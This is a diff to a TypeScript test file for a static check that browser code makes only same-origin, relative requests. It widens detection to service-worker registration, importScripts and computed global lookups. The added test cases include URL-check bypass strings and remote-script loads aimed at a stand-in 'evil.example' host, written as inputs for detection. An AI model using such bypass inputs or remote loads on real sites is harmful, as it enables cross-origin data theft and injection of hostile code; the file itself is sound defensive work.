@@ -81,12 +81,15 @@ const PINNED_HTTP_PACKAGES: string[] = [];
 const PUBLIC_VITE_NAMES: string[] = [];
 
 const SECRET_NAME = /(KEY|TOKEN|SECRET|PASSW|CREDENTIAL|PRIVATE|AUTH|COOKIE|SESSION)/i;
+/** A single leading `/`, then none of `/`, `\`, tab, LF, CR (browsers drop tabs and newlines in URLs). */
+const RELATIVE = /^\/(?![/\\\t\n\r])/;
 const ABSOLUTE = /^(?:https?|wss?):\/\//i;
-const NETWORK_FUNCTIONS = new Set(["fetch", "sendBeacon"]);
+const NETWORK_FUNCTIONS = new Set(["fetch", "sendBeacon", "importScripts"]);
 const FUNCTION_METHODS = new Set(["call", "apply", "bind"]);
 const NETWORK_CONSTRUCTORS = new Set(["EventSource", "WebSocket", "XMLHttpRequest", "Worker", "SharedWorker", "Request"]);
 const HTTP_PACKAGE =
   /^(?:axios|ky|ky-universal|got|node-fetch|cross-fetch|isomorphic-fetch|whatwg-fetch|undici|superagent|ofetch|wretch|request|needle|socket\.io-client|ws|eventsource|reconnecting-websocket|@microsoft\/fetch-event-source|graphql-request|@apollo\/client|urql|@urql\/[^/]+|swr|@trpc\/client)(?:\/|$)/;
+const GLOBAL_OBJECTS = new Set(["window", "globalThis", "self"]);
 const SOURCE_FILE = /\.(?:[cm]?[jt]sx?)$/;
 
 function parse(file: string, text: string): ts.SourceFile {
@@ -158,7 +161,8 @@ export function networkCalls(file: string, text: string): Site[] {
         return;
       }
       const name = finalName(node.expression);
-      if (name && NETWORK_FUNCTIONS.has(name)) {
+      const registers = name === "register" && receiver(node.expression) !== undefined && finalName(receiver(node.expression)!) === "serviceWorker";
+      if (name && (NETWORK_FUNCTIONS.has(name) || registers)) {
         const first = argument(node);
         found.push({ key: `${file} | ${callee(node)} | ${first ? first.getText(source) : ""}`, first, provable: true });
       } else if (name && FUNCTION_METHODS.has(name)) {
@@ -170,6 +174,14 @@ export function networkCalls(file: string, text: string): Site[] {
         }
       }
       return;
+    }
+    // `window[name]`, `globalThis[key]`, `self[k]`: any global could be named, `fetch` included.
+    if (ts.isElementAccessExpression(node) && !ts.isStringLiteralLike(node.argumentExpression)) {
+      const target = unwrap(node.expression);
+      if (ts.isIdentifier(target) && GLOBAL_OBJECTS.has(target.text)) {
+        found.push({ key: `${file} | ${node.getText(source)} (computed key) | `, first: undefined, provable: false });
+        return;
+      }
     }
     // `fetch` or `sendBeacon` named as a value (`const f = fetch`, `run(window.fetch)`).
     const isName =
@@ -204,14 +216,14 @@ export function networkCalls(file: string, text: string): Site[] {
 function isRelativeLiteral(expression: ts.Expression | undefined): boolean | undefined {
   if (!expression) return false;
   if (ts.isStringLiteral(expression) || ts.isNoSubstitutionTemplateLiteral(expression)) {
-    return /^\/(?![/\\])/.test(expression.text);
+    return RELATIVE.test(expression.text);
   }
   if (ts.isTemplateExpression(expression)) {
     // A template that begins with text is judged by that text; one that begins with `${`, or is
     // exactly `/` before its first `${` (the substitution could start with `/` or `\`), is not provable.
     const head = expression.head.text;
     if (head === "" || head === "/") return undefined;
-    return /^\/(?![/\\])/.test(head);
+    return RELATIVE.test(head);
   }
   return undefined;
 }
@@ -274,6 +286,18 @@ export function httpPackages(file: string, text: string): string[] {
     }
   });
   return found;
+}
+
+/** Pinned packages that nothing imports and the manifest does not list. */
+export function stalePackages(pinned: string[], used: string[], manifest: string): string[] {
+  const parsed = JSON.parse(manifest) as Record<string, Record<string, string> | undefined>;
+  const listed = ["dependencies", "devDependencies", "optionalDependencies", "peerDependencies"].flatMap((key) => Object.keys(parsed[key] ?? {}));
+  return pinned.filter((name) => !used.some((entry) => entry.endsWith(`| ${name}`)) && !listed.includes(name));
+}
+
+/** The environment without the `GIT_*` variables git sets for hooks: they would redirect `git ls-files`. */
+export function withoutGitVariables(env: NodeJS.ProcessEnv): NodeJS.ProcessEnv {
+  return Object.fromEntries(Object.entries(env).filter(([name]) => !name.startsWith("GIT_")));
 }
 
 export function dependencyProblems(manifest: string): string[] {
@@ -358,7 +382,7 @@ function pages(): { file: string; text: string }[] {
 
 /** Tracked files that could define or pass a VITE_* variable. */
 function configurationFiles(): { file: string; text: string }[] {
-  const listed = execFileSync("git", ["ls-files", "-z"], { cwd: repository, encoding: "utf8", maxBuffer: 64 * 1024 * 1024 })
+  const listed = execFileSync("git", ["ls-files", "-z"], { cwd: repository, encoding: "utf8", env: withoutGitVariables(process.env), maxBuffer: 64 * 1024 * 1024 })
     .split("\0")
     .filter(Boolean);
   const wanted = (path: string) =>
@@ -408,7 +432,15 @@ describe("browser requests are same-origin and relative (AGENTS.md, #591)", () =
   it("no HTTP-capable package is used or listed unless pinned", () => {
     const used = sources().flatMap(({ file, text }) => httpPackages(file, text));
     expect(used.filter((entry) => !PINNED_HTTP_PACKAGES.some((name) => entry.endsWith(`| ${name}`)))).toEqual([]);
-    expect(dependencyProblems(readFileSync(join(web, "package.json"), "utf8"))).toEqual([]);
+    const manifest = readFileSync(join(web, "package.json"), "utf8");
+    expect(dependencyProblems(manifest)).toEqual([]);
+    expect(stalePackages(PINNED_HTTP_PACKAGES, used, manifest)).toEqual([]);
+  });
+
+  it("a pinned package nothing uses is stale, and git runs without inherited GIT_* variables", () => {
+    expect(stalePackages(["axios", "ky"], ["src/x.ts | axios"], '{"dependencies":{"react":"19"}}')).toEqual(["ky"]);
+    expect(stalePackages(["ky"], [], '{"dependencies":{"ky":"1"}}')).toEqual([]);
+    expect(withoutGitVariables({ GIT_DIR: "/x", GIT_INDEX_FILE: "/y", GIT_WORK_TREE: "/z", PATH: "/bin", HOME: "/h" })).toEqual({ PATH: "/bin", HOME: "/h" });
   });
 
   it("scans every kind of source and the page", () => {
@@ -429,6 +461,21 @@ describe("browser requests are same-origin and relative (AGENTS.md, #591)", () =
     expect(planted("fetch(`${base}/api/v1/x`)")).toHaveLength(1);
     expect(planted("fetch(`/${path}`)")).toHaveLength(1);
     expect(planted("fetch(url)")).toHaveLength(1);
+    for (const literal of ['"/\\t/evil.example"', '"/\\n/evil.example"', '"/\\r/evil.example"', '"/\\\\evil.example"', '"//evil.example"']) {
+      expect(planted(`fetch(${literal})`), literal).toHaveLength(1);
+    }
+    expect(planted("fetch(`/\\t/evil.example${x}`)")).toHaveLength(1);
+    expect(planted("importScripts('https://cdn.example/x.js')")).toHaveLength(1);
+    expect(planted("importScripts('/sw-helper.js')")).toEqual([]);
+    expect(planted("navigator.serviceWorker.register('https://evil.example/sw.js')")).toHaveLength(1);
+    expect(planted("navigator.serviceWorker.register('/sw.js')")).toEqual([]);
+    expect(planted("registry.register(plugin)")).toEqual([]);
+    expect(planted('window[name]("/api/v1/me")')).toHaveLength(1);
+    expect(planted("globalThis[key](u)")).toHaveLength(1);
+    expect(planted("self[k]")).toHaveLength(1);
+    expect(planted('window["fetch"]("/api/v1/me")')).toEqual([]);
+    expect(planted("items[i]; row[key]")).toEqual([]);
+    expect(requestProblems("src/x.ts", "window[name](u)", { "src/x.ts | window[name] (computed key) | ": "reviewed" })).toEqual([]);
     expect(planted('new EventSource("https://example.com/stream")')).toHaveLength(1);
     expect(planted('new WebSocket("wss://example.com/ws")')).toHaveLength(1);
     expect(planted('new Worker("https://example.com/w.js")')).toHaveLength(1);
